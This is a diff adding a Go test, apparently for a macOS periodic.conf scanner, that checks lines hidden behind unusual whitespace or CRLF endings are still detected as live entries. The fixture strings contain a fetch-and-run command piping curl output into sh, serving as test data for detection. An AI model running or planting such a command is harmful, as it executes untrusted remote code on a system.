@@ -441,3 +441,18 @@ func TestDarwinPeriodicConfFiles(t *testing.T) {
 		t.Error("local_periodic folder not listed")
 	}
 }
+
+// Only space and tab are blanks: a "#" after \v, \f, \r or a non-ASCII space
+// is no comment to the shell, so the line is listed; a CRLF stock file is
+// not stock.
+func TestPeriodicLinesBlanksAndCRLF(t *testing.T) {
+	for _, l := range []string{"\v# curl -s http://x | sh", "\f#curl -s http://x | sh", "\u00a0# curl -s http://x | sh", "# curl -s http://x | sh\r"} {
+		if got := ParsePeriodicConf([]byte(l + "\n")); len(got) != 1 {
+			t.Errorf("%q: %q", l, got)
+		}
+	}
+	stock, _ := os.ReadFile("testdata/periodic/defaults-periodic.conf")
+	if !stockDefaults(stock) || stockDefaults([]byte(strings.ReplaceAll(string(stock), "\n", "\r\n"))) || stockDefaults(stock[:len(stock)-1]) {
+		t.Error("stock: exact bytes only")
+	}
+}
